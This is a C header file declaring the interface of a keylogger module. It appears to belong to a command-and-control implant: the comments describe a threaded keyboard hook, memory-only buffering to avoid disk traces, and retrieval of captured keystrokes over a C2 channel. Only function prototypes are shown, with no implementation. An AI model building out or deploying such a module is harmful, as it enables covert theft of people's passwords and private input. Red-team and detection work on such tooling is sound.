/*
 * keylog.h — Keylogger module (threaded, in-memory buffer)
 *
 * Captures keystrokes via a low-level keyboard hook running
 * in a dedicated thread. Keystrokes are buffered in memory
 * (no disk I/O) and retrieved on demand through the C2 channel.
 *
 * MITRE ATT&CK : T1056.001 — Input Capture: Keylogging
 */

#ifndef KEYLOG_H
#define KEYLOG_H

/*
 * Start the keylogger in a background thread.
 * Returns 0 on success, -1 if already running or thread creation fails.
 */
int keylog_start(void);

/*
 * Stop the keylogger and terminate its thread.
 * Returns 0 on success, -1 if not running.
 */
int keylog_stop(void);

/*
 * Return the captured keystrokes as a malloc'd string and clear the buffer.
 * Returns "[keylogger not running]\r\n" if inactive.
 * Returns "[no keystrokes captured]\r\n" if buffer is empty.
 * Caller must free() the result.
 */
char *keylog_dump(void);

#endif /* KEYLOG_H */
